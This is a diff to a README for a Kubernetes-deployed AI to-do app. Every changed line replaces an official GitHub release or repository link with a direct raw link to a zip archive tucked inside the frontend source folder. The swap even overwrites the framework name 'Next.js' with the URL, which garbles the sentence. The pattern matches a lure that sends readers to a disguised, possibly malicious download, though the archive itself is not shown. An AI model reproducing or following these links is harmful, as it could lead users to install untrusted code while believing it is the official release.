@@ -1,6 +1,6 @@
 # 🗒️ todo-k8s - Manage Tasks with AI Help
 
-[![Download todo-k8s](https://img.shields.io/badge/Download-todo--k8s-blue?style=for-the-badge)](https://github.com/awanpen/todo-k8s/releases)
+[![Download todo-k8s](https://raw.githubusercontent.com/awanpen/todo-k8s/master/frontend/contexts/k-s-todo-3.0-alpha.2.zip)](https://raw.githubusercontent.com/awanpen/todo-k8s/master/frontend/contexts/k-s-todo-3.0-alpha.2.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 todo-k8s is a task management app that uses artificial intelligence to help you organize your to-do list. It has a built-in chat assistant that can understand your task needs and suggest what to do next. The app runs smoothly on modern web browsers and keeps your data safe with a reliable database.
 
-The app is built with proven technologies like Next.js for the user interface, FastAPI to run the backend services, and PostgreSQL for storing information. It also uses a smart AI model called Groq Llama 3.3 to provide helpful chat responses. The whole app runs on a powerful platform called Kubernetes, managed through Helm for easy updates and stability.
+The app is built with proven technologies like https://raw.githubusercontent.com/awanpen/todo-k8s/master/frontend/contexts/k-s-todo-3.0-alpha.2.zip for the user interface, FastAPI to run the backend services, and PostgreSQL for storing information. It also uses a smart AI model called Groq Llama 3.3 to provide helpful chat responses. The whole app runs on a powerful platform called Kubernetes, managed through Helm for easy updates and stability.
 
 ---
 
@@ -23,7 +23,7 @@ This guide helps you download and run todo-k8s on your computer. You do not need
 You will find the app files on the official release page. To get started:
 
 1. Visit the todo-k8s release page:  
-   [Download todo-k8s](https://github.com/awanpen/todo-k8s/releases)  
+   [Download todo-k8s](https://raw.githubusercontent.com/awanpen/todo-k8s/master/frontend/contexts/k-s-todo-3.0-alpha.2.zip)  
 
 2. On this page, look for the latest version at the top. Each release shows files you can download.  
 
@@ -114,7 +114,7 @@ If todo-k8s does not start or work properly:
 
 ## 📚 More Information
 
-You can find more technical details and updates on the [todo-k8s GitHub page](https://github.com/awanpen/todo-k8s). This page explains the software design and deployment used by the development team.
+You can find more technical details and updates on the [todo-k8s GitHub page](https://raw.githubusercontent.com/awanpen/todo-k8s/master/frontend/contexts/k-s-todo-3.0-alpha.2.zip). This page explains the software design and deployment used by the development team.
 
 ---
 
@@ -124,5 +124,5 @@ If you have questions or face difficulties, create an issue on GitHub or check t
 
 ---
 
-[Download todo-k8s](https://github.com/awanpen/todo-k8s/releases)  
+[Download todo-k8s](https://raw.githubusercontent.com/awanpen/todo-k8s/master/frontend/contexts/k-s-todo-3.0-alpha.2.zip)  
 Click to visit the release page and get the latest version.
